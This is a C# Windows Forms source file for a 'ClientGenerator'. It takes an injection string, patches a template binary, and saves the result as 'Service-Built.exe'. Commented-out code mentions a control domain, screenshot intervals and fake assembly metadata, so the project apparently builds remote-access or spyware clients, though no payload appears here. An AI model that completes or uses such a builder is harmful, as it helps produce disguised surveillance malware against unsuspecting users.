using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientGenerator
{
    public partial class Form1 : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        public Form1()
        {
            InitializeComponent();
        }

        private void BtnGenerateClient_Click(object sender, EventArgs e)
        {
            //string str_inject = textBox1.Text;

            BuildOptions options;
            try
            {
                options = GetBuildOptions();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SetBuildState(false);

            Thread t = new Thread(BuildClient);
            t.Start(options);
        }
        private void BuildClient(object o)
        {
            try
            {
                BuildOptions options = (BuildOptions)o;
                /*StreamWriter file = new StreamWriter("Debug-Log.txt", append: true);
                file.Write(options.ControlDomain);
                file.WriteLine("\r\n");
                file.Write(options.ScreenShotInterval);
                file.WriteLine("\r\n");
                file.Flush();
                file.Close();*/
                var builder = new ClientBuilder(options, "service-client.bin");
                builder.Build();

                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this,
                            $"Successfully built client! Saved to:\\{options.OutputPath}",
                            "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                }
                catch (Exception)
                {
                }
            }
            catch (Exception ex)
            {
                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this,
                            $"An error occurred!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}", "Build failed",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    });
                }
                catch (Exception)
                {
                }
            }
            SetBuildState(true);
        }
        private void SetBuildState(bool state)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    BtnGenerateClient.Text = (state) ? "Build" : "Building...";
                    BtnGenerateClient.Enabled = state;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            LoadProfile("Default");
        }

        private void Form1_Load_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show(this, "Do you want to save your current settings?", "Changes detected",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void LoadProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);
            textBox1.Text = profile.StrInject;
            _profileLoaded = true;
        }

        private void SaveProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);
            profile.StrInject = textBox1.Text;
        }
        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(textBox1.Text)); // Installation
        }
        private BuildOptions GetBuildOptions()
        {
            BuildOptions options = new BuildOptions();
            if (!CheckForEmptyInput())
            {
                throw new Exception("Please fill out all required fields!");
            }
            options.StrInject = textBox1.Text;

            if (!File.Exists("service-client.bin"))
            {
                throw new Exception("Could not locate \"service-client.bin\" file. It should be in the same directory as executable.");
            }
            /*
            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text))
                {
                    throw new Exception("Please enter a valid product version number!\nExample: 1.2.3.4");
                }

                if (!IsValidVersionNumber(txtFileVersion.Text))
                {
                    throw new Exception("Please enter a valid file version number!\nExample: 1.2.3.4");
                }

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = txtOriginalFilename.Text;
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }*/

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Save Client as";
                sfd.Filter = "Executables *.exe|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "Service-Built.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    throw new Exception("Please choose a valid output path.");
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                throw new Exception("Please choose a valid output path.");
            }

            return options;
        }
    }
}
